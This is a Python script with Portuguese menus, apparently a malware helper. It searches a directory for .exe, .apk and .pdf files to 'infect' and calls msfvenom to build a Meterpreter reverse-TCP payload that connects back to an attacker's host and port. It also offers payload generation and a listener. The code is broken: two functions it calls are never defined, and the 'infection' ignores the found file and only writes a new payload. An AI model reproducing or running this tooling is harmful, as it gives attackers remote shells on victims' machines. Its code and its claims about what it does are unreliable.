import subprocess
import socket
import os

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0.1)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception:
        return "127.0.0.1"

def find_target_file(target_directory):
    for root, _, files in os.walk(target_directory):
        for file in files:
            if file.endswith(".exe") or file.endswith(".apk") or file.endswith(".pdf"):
                return os.path.join(root, file)
    return None

def infect_existing_file(file_path, lhost, lport):
    if not file_path:
        print("Nenhum arquivo alvo encontrado no diretório especificado.")
        return

    while True:
        output_name = input("Insira o nome do arquivo de saída (output): ")
        if not output_name:
            print("Nome de saída inválido. Tente novamente.")
        else:
            break

    output_path = os.path.join(os.path.dirname(__file__), output_name)
    print(f"Infectando o arquivo {file_path} com payload para {lhost}:{lport} e salvando como {output_name}...")
    cmd = ["msfvenom", "-p", "windows/meterpreter/reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}", "-f", "exe", "-o", output_path]
    print("Comando usado para infectar o arquivo:")
    print(" ".join(cmd))
    try:
        subprocess.call(cmd)
        print(f"Arquivo {output_name} infectado com sucesso.")
    except Exception as e:
        print(f"Erro ao infectar o arquivo: {str(e)}")

def main():
    local_ip = get_local_ip()
    while True:
        target_directory = input("Insira o caminho do diretório onde deseja buscar arquivos para infectar: ")
        if not os.path.exists(target_directory):
            print("Diretório não encontrado. Verifique o caminho e tente novamente.")
        else:
            break

    while True:
        print("Bem-vindo ao seu script de geração de payload e listener.")
        print("Selecione a opção desejada:")
        print("1. Gerar payload")
        print("2. Iniciar listener")
        print("3. Infectar arquivo existente")
        print("4. Sair")

        option = input("Escolha uma opção (1/2/3/4): ")

        if option == "1":
            payload_type = input("Escolha o tipo de payload (pdf/exe/apk): ")
            lhost = input(f"Insira o LHOST (padrão: {local_ip}): ") or local_ip
            lport = input("Insira o LPORT: ")
            generate_payload(payload_type, lhost, lport)
        elif option == "2":
            lhost = input(f"Insira o LHOST (padrão: {local_ip}): ") or local_ip
            lport = input("Insira o LPORT: ")
            start_listener(lhost, lport)
        elif option == "3":
            target_file = find_target_file(target_directory)
            infect_existing_file(target_file, lhost, lport)
        elif option == "4":
            print("Encerrando o programa.")
            break
        else:
            print("Opção inválida. Tente novamente.")

if __name__ == "__main__":
    main()